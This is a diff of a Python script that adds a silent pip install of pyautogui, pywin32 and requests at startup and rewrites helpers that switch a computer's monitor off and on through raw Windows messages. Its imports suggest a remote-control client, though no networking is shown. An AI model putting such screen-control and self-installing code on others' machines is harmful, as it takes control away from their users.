@@ -1,5 +1,6 @@
-#!/usr/bin
-# Made by gokiimax
+import os
+os.system("python3 -m pip install pyautogui pillow pywin32 requests")
+
 import socket
 import subprocess
 import time
@@ -9,12 +10,10 @@ import base64
 import ctypes
 import sys
 import platform
-from xmlrpc.client import Server
 import pyautogui
 import string
 import random
 from time import gmtime, strftime
-
 import requests
 
 #############################################################################
@@ -123,14 +122,7 @@ class Utils:
             os.system("xset dpms force off")
 
         elif sys.platform.startswith('win'):
-            import win32gui
-            import win32con
-            SC_MONITORPOWER = 0xF170
-            win32gui.SendMessageTimeout(win32con.HWND_BROADCAST,
-                win32con.WM_SYSCOMMAND, 
-                SC_MONITORPOWER, 2, 
-                win32con.SMTO_NOTIMEOUTIFNOTHUNG, 
-                1000)
+            ctypes.windll.user32.SendMessageW(65535, 274, 61808, 2)
 
 #=====================================================================#
 
@@ -140,14 +132,10 @@ class Utils:
             os.system("xset dpms force on")
 
         elif sys.platform.startswith('win'):
-            import win32gui
-            import win32con
-            SC_MONITORPOWER = 0xF170
-            win32gui.SendMessageTimeout(win32con.HWND_BROADCAST,
-                win32con.WM_SYSCOMMAND, 
-                SC_MONITORPOWER, 2, 
-                win32con.SMTO_NOTIMEOUTIFNOTHUNG, 
-                1000)
+            import win32api, win32con
+            x, y = (0, 0)
+            ctypes.windll.user32.SendMessageW(65535, 274, 61808, -1)
+            win32api.mouse_event(win32con.MOUSEEVENTF_MOVE, x, y)
 
 
 #=====================================================================#
